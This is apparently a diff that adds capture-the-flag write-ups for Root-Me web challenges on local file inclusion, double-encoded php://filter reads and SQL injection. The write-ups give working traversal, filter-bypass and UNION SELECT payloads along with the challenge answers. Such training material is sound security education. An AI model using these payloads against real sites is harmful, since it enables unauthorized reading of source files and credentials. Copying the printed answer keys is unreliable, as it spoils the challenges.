@@ -38,8 +38,8 @@ These challenges are designed to train users on HTML, HTTP and other server side
 30. [Command injection - Filter bypass](#command-injection-filter-bypass)
 31. [Java - Server-side Template Injection](#java-server-side-template-injection)
 32. [JSON Web Token (JWT) - Public key](#json-web-token-jwt-public-key)
-33. [Local File Inclusion](#local-file-inclusion)
-34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding)
+33. [Local File Inclusion](#local-file-inclusion) 🗸
+34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding) 🗸
 35. [Node - Eval](#node-eval)
 36. [PHP - Loose Comparison](#php-loose-comparison)
 37. [PHP - preg_replace()](#php-preg-replace)
@@ -47,7 +47,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 39. [Remote File Inclusion](#remote-file-inclusion)
 40. [SQL injection - Authentication](#sql-injection-authentication) 🗸
 41. [SQL injection - Authentication - GBK](#sql-injection-authentication-gbk)
-42. [SQL injection - String](#sql-injection-string)
+42. [SQL injection - String](#sql-injection-string) 🗸
 43. [XSLT - Code execution](#xslt-code-execution)
 44. [LDAP injection - Authentication](#ldap-injection-authentication)
 45. [Node - Serialize](#node-serialize)
@@ -2886,6 +2886,160 @@ NoTQYipcRKkgrqG
 
 ---
 
+## Local File Inclusion
+
+- Author: g0uZ
+- Date: 02 October 2011
+- Points: 30
+- Level: 3
+
+### Statement
+
+Get in the admin section.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch16/).
+
+### Resources
+
+1. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
+2. [Source coding auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
+3. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
+4. [Remote File Inclusion and Local File Inclusion explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We visit the site and see files included in the websites subdirectory that are available via the menu.  By navigating to the root directory, we find a folder named "admin" that we can access:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch16/?files=../admin
+~~~
+
+This has a php index file which contains the admin password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+OpbNJ60xYpvAQU8
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## Local File Inclusion Double encoding
+
+- Author: zM_
+- Date: 13 June 2016
+- Points: 30
+- Level: 3
+
+### Statement
+
+Find the validation password in the source files of the website.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch45/).
+
+### Resources
+
+1. [Double Encoding](https://www.owasp.org/index.php/Double_Encoding).
+2. [Local File Inclusion](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf).
+3. Remote File Inclusion and Local File Inclusion Explained](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We visit the site and see files related to a guys CV.  Attempting to visit the root directory (http://challenge01.root-me.org/web-serveur/ch45/index.php?page=../) we get the response ("Attack detected").
+
+We will need to use a filter with double encoding to bypass the web filter.
+
+~~~
+php://filter/convert.base64-encode/resource=cv
+double encoded becomes:
+php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
+~~~
+
+Appending this to the URL provides a base64 encoded html cv file. This can be [decoded online](https://www.base64decode.org/) to reveal the cv source code:
+
+~~~html
+<?php include("conf.inc.php"); ?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>J. Smith - CV</title>
+  </head>
+  <body>
+    <?= $conf['global_style'] ?>
+    <nav>
+      <a href="index.php?page=home">Home</a>
+      <a href="index.php?page=cv" class="active">CV</a>
+      <a href="index.php?page=contact">Contact</a>
+    </nav>
+    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
+    <h3>Professional doer</h3>
+    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
+    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
+    <?php
+      foreach ($conf['cv']['jobs'] as $job) {
+    ?>
+      <div class="job">
+        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
+      </div>
+    <?php
+      }
+    ?>
+  </body>
+</html>
+~~~
+
+This reveals the config file conf.inc.php, we can access using the same filter:
+	
+~~~
+http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf
+~~~
+
+Which provides a base64 encoding of the conf php file including the challenge password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+Th1sIsTh3Fl4g!
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
 
 ## SQL injection Authentication
 
@@ -2972,6 +3126,62 @@ This is returning an incorrect record.  We can use the [SQLite LIMIT](https://ww
 
 ~~~
 t0_W34k!$
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## SQL injection String
+
+- Author: g0uZ
+- Date: 24 December 2012
+- Points: 30
+- Level: 3
+
+### Statement
+
+Retrieve the administrator password
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch19/).
+
+### Resources
+
+1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
+2. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
+3. [BLackhat US 2006: SQL Injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
+4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the site, we find a search function that we can inject queries into.  After several trials, we find the following injection that provides the usernames and passwords:
+
+~~~
+admin' or id='1' union select username,password from users-- -+
+~~~
+
+This provides 3 usernames and passwords including the admin password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+c4K04dtIaJsuWdi
 ~~~
 
 </details>
